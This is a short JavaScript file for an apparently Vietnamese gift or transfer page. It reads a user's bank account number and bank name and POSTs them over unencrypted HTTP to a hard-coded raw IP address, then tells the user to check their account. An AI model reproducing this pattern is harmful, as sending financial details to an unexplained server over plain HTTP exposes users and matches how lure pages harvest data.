const card = document.querySelector(".card");
card.addEventListener("click", () => {
    card.classList.add("show");
});

const sendButton = document.getElementById("send");

sendButton.addEventListener("click", () => {
    const acc = document.getElementById("stk").value;
    const bank = document.getElementById("bank").value;
    const body = JSON.stringify({ acc, bank });
    fetch("http://47.241.171.41/send", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: body,
    }).then(() => {
        const hidable = document.getElementsByClassName("hidable");
        for (let i = 0; i < hidable.length; i++) {
            hidable.item(i).classList.toggle("hide");
        }

        const phead = document.getElementById("head");
        phead.textContent = "Check tài khoản nha!";
    });
});
